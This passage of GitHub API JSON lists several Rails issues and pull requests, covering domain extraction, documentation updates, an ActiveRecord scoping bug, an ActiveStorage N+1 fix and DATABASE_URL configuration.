`call'\r\n/Users/eugene/lib/rails/actionpack/lib/action_dispatch/middleware/host_authorization.rb:141:in `call'\r\n/Users/eugene/lib/rails/railties/lib/rails/engine.rb:536:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/configuration.rb:272:in `call'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/request.rb:100:in `block in handle_request'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/thread_pool.rb:378:in `with_force_shutdown'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/request.rb:99:in `handle_request'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/server.rb:464:in `process_client'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/server.rb:245:in `block in run'\r\n/Users/eugene/.rbenv/versions/3.2.2/lib/ruby/gems/3.2.0/gems/puma-6.4.1/lib/puma/thread_pool.rb:155:in `block in spawn_thread'\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50764/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50764/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50763",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50763/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50763/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50763/events",
        "html_url": "https://github.com/rails/rails/pull/50763",
        "id": 2082801297,
        "node_id": "PR_kwDNIULOZCHHNg",
        "number": 50763,
        "title": "Allow custom domain extractor class on ActionDispatch::Http::URL",
        "user": {
            "login": "rainerborene",
            "id": 101501,
            "node_id": "MDQ6VXNlcjEwMTUwMQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/101501?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rainerborene",
            "html_url": "https://github.com/rainerborene",
            "followers_url": "https://api.github.com/users/rainerborene/followers",
            "following_url": "https://api.github.com/users/rainerborene/following{/other_user}",
            "gists_url": "https://api.github.com/users/rainerborene/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rainerborene/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rainerborene/subscriptions",
            "organizations_url": "https://api.github.com/users/rainerborene/orgs",
            "repos_url": "https://api.github.com/users/rainerborene/repos",
            "events_url": "https://api.github.com/users/rainerborene/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rainerborene/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-15T23:32:04Z",
        "updated_at": "2024-01-18T20:47:53Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50763",
            "html_url": "https://github.com/rails/rails/pull/50763",
            "diff_url": "https://github.com/rails/rails/pull/50763.diff",
            "patch_url": "https://github.com/rails/rails/pull/50763.patch",
            "merged_at": null
        },
        "body": "In these last years we have been using a monkey patch at our company that smartly detects domain and subdomains according to the [Public Suffix database](https://publicsuffix.org/). There are a few gems in our ecosystems like [public_suffix](https://github.com/weppos/publicsuffix-ruby) and [mini_suffix](https://github.com/discourse/mini_suffix) that does exactly that. But Rails uses an older and primitive method that splits the domain tld using `config.action_dispatch.tld_length` option. This pull request changes that by allowing developers to specify a custom domain extractor class.\r\n\r\nThis is really useful for any SaaS company that offers custom domain and subdomains.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50763/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50763/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50762",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50762/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50762/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50762/events",
        "html_url": "https://github.com/rails/rails/pull/50762",
        "id": 2082693698,
        "node_id": "PR_kwDNIULOZCBRow",
        "number": 50762,
        "title": "Document some ActionText methods [ci-skip]",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-15T21:22:33Z",
        "updated_at": "2024-01-25T20:47:46Z",
        "closed_at": "2024-01-25T19:57:58Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50762",
            "html_url": "https://github.com/rails/rails/pull/50762",
            "diff_url": "https://github.com/rails/rails/pull/50762.diff",
            "patch_url": "https://github.com/rails/rails/pull/50762.patch",
            "merged_at": "2024-01-25T19:57:58Z"
        },
        "body": "### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50762/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50762/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50761",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50761/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50761/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50761/events",
        "html_url": "https://github.com/rails/rails/pull/50761",
        "id": 2082689851,
        "node_id": "PR_kwDNIULOZCBEaQ",
        "number": 50761,
        "title": "Improve documentation of ActiveRecord::Core.configurations",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-15T21:18:15Z",
        "updated_at": "2024-01-16T12:15:00Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50761",
            "html_url": "https://github.com/rails/rails/pull/50761",
            "diff_url": "https://github.com/rails/rails/pull/50761.diff",
            "patch_url": "https://github.com/rails/rails/pull/50761.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThe documenation of `ActiveRecord::Core.configurations=` [reads](https://edgeapi.rubyonrails.org/classes/ActiveRecord/Core.html#method-c-configurations-3D) like the documentation for the getter instead of the setter.\r\nIt should not describe what is returned, but what arguments are expected.\r\n\r\nThis changes moves the documentation of the setter to the getter and adds a new comment to the setter.\r\n\r\nThis commit has 2 separate commits to make sure the diffs only apply to documentation and not the code.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50761/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50761/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50760",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50760/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50760/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50760/events",
        "html_url": "https://github.com/rails/rails/issues/50760",
        "id": 2082680244,
        "node_id": "I_kwDNIULOfCMttA",
        "number": 50760,
        "title": "ActiveRecord::Delegation leaks scope to inner queries on the same model",
        "user": {
            "login": "jaynetics",
            "id": 10758879,
            "node_id": "MDQ6VXNlcjEwNzU4ODc5",
            "avatar_url": "https://avatars.githubusercontent.com/u/10758879?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jaynetics",
            "html_url": "https://github.com/jaynetics",
            "followers_url": "https://api.github.com/users/jaynetics/followers",
            "following_url": "https://api.github.com/users/jaynetics/following{/other_user}",
            "gists_url": "https://api.github.com/users/jaynetics/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jaynetics/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jaynetics/subscriptions",
            "organizations_url": "https://api.github.com/users/jaynetics/orgs",
            "repos_url": "https://api.github.com/users/jaynetics/repos",
            "events_url": "https://api.github.com/users/jaynetics/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jaynetics/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-15T21:07:43Z",
        "updated_at": "2024-01-16T10:52:12Z",
        "closed_at": "2024-01-15T21:15:35Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n```ruby\r\n# define a convenient wrapper so we don't always have to use the clunky syntax\r\ndef ApplicationRecord.replica_find_each(...)\r\n  ActiveRecord::Base.connected_to(role: :replica) do\r\n    find_each(...)\r\n  end\r\nend\r\n\r\n# send birthday invitations\r\nUser.where(birth_date: Date.today).replica_find_each do |user|\r\n  User.where.not(birth_date: Date.today).invite(to: user)\r\nend\r\n```\r\n\r\n### Expected behavior\r\nThe inner query is `WHERE birth_date != <today>` and finds some users.\r\n\r\n### Actual behavior\r\nThe inner query is `WHERE birth_date = <today> AND WHERE birth_date != <today>` and returns an empty relation. \r\n\r\nThis is because the outer scoping (`where(birth_date: Date.today)`) is mixed into the inner query by [this code](https://github.com/rails/rails/blob/af2bbd5f66ce03697dd80a1448c2c3179d7c0fda/activerecord/lib/active_record/relation/delegation.rb#L78).\r\n\r\n### Ideas\r\n\r\nThe automatic scoping *usually* makes sense, e.g. you would want methods like this one to adapt correctly to Relations:\r\n\r\n```ruby\r\ndef User.exaggerated_count\r\n  count * 2\r\nend\r\n\r\nUser.exaggerated_count # => 2000\r\nUser.where(created_at: 10.days.ago..).exaggerated_count # => 200\r\n```\r\n\r\nWhen doing inner queries, however, the resulting bugs can be *quite* subtle and hard to track down!\r\n\r\nIdea 1: Warn for access to the same model within any given block in delegated relation methods? \r\n\r\nIdea 2: Revert to the surrounding scoping inside any given block?\r\n\r\nIdea 3: Deprecate delegation of class methods (non-scopes) through relations and add new helper(s) to define such methods instead - helper(s) that make it obvious whether or not scoping will be applied?\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50760/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50760/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50759",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50759/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50759/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50759/events",
        "html_url": "https://github.com/rails/rails/issues/50759",
        "id": 2082675602,
        "node_id": "I_kwDNIULOfCMbkg",
        "number": 50759,
        "title": "Migrate Rails API doc to use Markdown instead of RDoc format",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/87",
            "html_url": "https://github.com/rails/rails/milestone/87",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/87/labels",
            "id": 10350173,
            "node_id": "MI_kwDNIULOAJ3uXQ",
            "number": 87,
            "title": "8.0.0",
            "description": null,
            "creator": {
                "login": "dhh",
                "id": 2741,
                "node_id": "MDQ6VXNlcjI3NDE=",
                "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/dhh",
                "html_url": "https://github.com/dhh",
                "followers_url": "https://api.github.com/users/dhh/followers",
                "following_url": "https://api.github.com/users/dhh/following{/other_user}",
                "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
                "organizations_url": "https://api.github.com/users/dhh/orgs",
                "repos_url": "https://api.github.com/users/dhh/repos",
                "events_url": "https://api.github.com/users/dhh/events{/privacy}",
                "received_events_url": "https://api.github.com/users/dhh/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 18,
            "closed_issues": 9,
            "state": "open",
            "created_at": "2023-12-26T22:00:17Z",
            "updated_at": "2024-02-22T20:28:18Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-01-15T21:02:56Z",
        "updated_at": "2024-01-15T21:02:57Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "### NOTE: We aren't going to accept any PR doing this migration\r\n\r\nFrom time to time, we have to remember that while documenting some method on Rails, using `+foo+` to denote a method name or argument sometimes need to change to be `<tt>foo</tt>` in order to be documented. We also sometimes receive PRs with people accidentally introducing backticks that doesn't have any effect in the documentation.\r\n\r\nOur guides also uses Markdown syntax, so contributors need to know they need to change syntax when writting documentation.\r\n\r\nText editors, like VScode don't know how to highlight RDoc code so often see Rails documentation formatted like this when you hover over a class\r\n\r\n<img width=\"802\" alt=\"Screenshot 2024-01-15 at 4 01 03PM\" src=\"https://github.com/rails/rails/assets/47848/2e31157d-dd86-487d-83d6-c34e4c013151\">\r\n<img width=\"810\" alt=\"Screenshot 2024-01-15 at 4 02 00PM\" src=\"https://github.com/rails/rails/assets/47848/435e899b-8cfc-4bf4-9b8c-dfd7383fd867\">\r\n\r\nNowadays, RDoc supports Markdown as syntax. So we can avoid all those problems migrating all our API documentation to use Markdown.\r\n\r\n### NOTE: We aren't going to accept any PR doing this migration",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50759/reactions",
            "total_count": 10,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 10,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50759/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50758",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50758/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50758/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50758/events",
        "html_url": "https://github.com/rails/rails/pull/50758",
        "id": 2082551733,
        "node_id": "PR_kwDNIULOZB5l0w",
        "number": 50758,
        "title": "Eagerly load preview images (N+1)",
        "user": {
            "login": "tenderlove",
            "id": 3124,
            "node_id": "MDQ6VXNlcjMxMjQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3124?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tenderlove",
            "html_url": "https://github.com/tenderlove",
            "followers_url": "https://api.github.com/users/tenderlove/followers",
            "following_url": "https://api.github.com/users/tenderlove/following{/other_user}",
            "gists_url": "https://api.github.com/users/tenderlove/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tenderlove/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tenderlove/subscriptions",
            "organizations_url": "https://api.github.com/users/tenderlove/orgs",
            "repos_url": "https://api.github.com/users/tenderlove/repos",
            "events_url": "https://api.github.com/users/tenderlove/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tenderlove/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-15T19:03:14Z",
        "updated_at": "2024-01-25T07:34:18Z",
        "closed_at": "2024-01-16T18:44:11Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50758",
            "html_url": "https://github.com/rails/rails/pull/50758",
            "diff_url": "https://github.com/rails/rails/pull/50758.diff",
            "patch_url": "https://github.com/rails/rails/pull/50758.patch",
            "merged_at": "2024-01-16T18:44:11Z"
        },
        "body": "For non-image attachments (like videos), generated representations are\r\ncreated as a preview_image_attachment instead of as normal variants, and\r\nas a result aren't included in the `with_attached_` scopes. This adds\r\nthose preview image attachments to the `includes` of these scopes to\r\navoid an N+1 when iterating over a collection of attachments and\r\nfetching the key of their representation (variants).\r\n\r\nFixes #50560",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50758/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50758/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50757",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50757/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50757/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50757/events",
        "html_url": "https://github.com/rails/rails/pull/50757",
        "id": 2082192756,
        "node_id": "PR_kwDNIULOZBmY0A",
        "number": 50757,
        "title": "Make `schema_dump`, `query_cache`, `replica` and `database_tasks` configurable via `DATABASE_URL`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-15T14:52:26Z",
        "updated_at": "2024-01-15T15:01:39Z",
        "closed_at": "2024-01-15T14:57:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50757",
            "html_url": "https://github.com/rails/rails/pull/50757",
            "diff_url": "https://github.com/rails/rails/pull/50757.diff",
            "patch_url": "https://github.com/rails/rails/pull/50757.patch",
            "merged_at": "2024-01-15T14:57:34Z"
        },
        "body": "Fix: https://github.com/rails/rails/pull/50745\r\n\r\nI went a bit farther and handled all the boolean configs, not just `schema_cache`.\r\n\r\nCo-Authored-By: @mscoutermarsh ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50757/reactions",
            "total_count": 3,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 3,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50757/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50756",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50756/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50756/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50756/events",
        "html_url": "https://github.com/rails/rails/pull/50756",
        "id": 2081977384,
        "node_id": "PR_kwDNIULOZBasTA",
        "number": 50756,
        "title": "Update the screenshot in the section 8.4 of Getting Started with Rails [ci skip]",
        "user": {
            "login": "Angy-h",
            "id": 140281190,
            "node_id": "U_kgDOCFyFZg",
            "avatar_url": "https://avatars.githubusercontent.com/u/140281190?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Angy-h",
            "html_url": "https://github.com/Angy-h",
            "followers_url": "https://api.github.com/users/Angy-h/followers",
            "following_url": "https://api.github.com/users/Angy-h/following{/other_user}",
            "gists_url": "https://api.github.com/users/Angy-h/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Angy-h/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Angy-h/subscriptions",
            "organizations_url": "https://api.github.com/users/Angy-h/orgs",
            "repos_url": "https://api.github.com/users/Angy-h/repos",
            "events_url": "https://api.github.com/users/Angy-h/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Angy-h/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-15T12:52:53Z",
        "updated_at": "2024-01-17T09:11:48Z",
        "closed_at": "2024-01-17T09:11:48Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50756",
            "html_url": "https://github.com/rails/rails/pull/50756",
            "diff_url": "https://github.com/rails/rails/pull/50756.diff",
            "patch_url": "https://github.com/rails/rails/pull/50756.patch",
            "merged_at": "2024-01-17T09:11:48Z"
        },
        "body": "### Motivation / Background\r\nI've been following the [getting started guide](https://edgeguides.rubyonrails.org/getting_started.html). Upon reaching the end of section 8.4, I noticed several differences between the output displayed in the guide's screenshot and what appeared on my computer (rails version: Rails 7.1.2, ruby version: ruby 3.2.2):\r\n\r\n* The positioning of \"Edit/Back\" differs.\r\n* While the guide provides an explanation for \"Destroy,\" it doesn't offer one for \"Back.\"\r\n* My output lacked the \"Title:\" and \"Text:\" elements.\r\n* The text \"Rails is Awesome!\" appeared larger due to the h1 tag.\r\n\r\nI would like to update the existing screenshot.\r\n\r\n### Detail\r\nThis Pull Request changes article_with_comments.png in /guides/assets/images/getting_started.\r\n\r\n### Checklist\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: [Fix #issue-number]\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50756/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50756/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50755",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50755/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50755/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50755/events",
        "html_url": "https://github.com/rails/rails/issues/50755",
        "id": 2081488829,
        "node_id": "I_kwDNIULOfBD_vQ",
        "number": 50755,
        "title": "Action Mailbox mistakes attachment as body if no body exists",
        "user": {
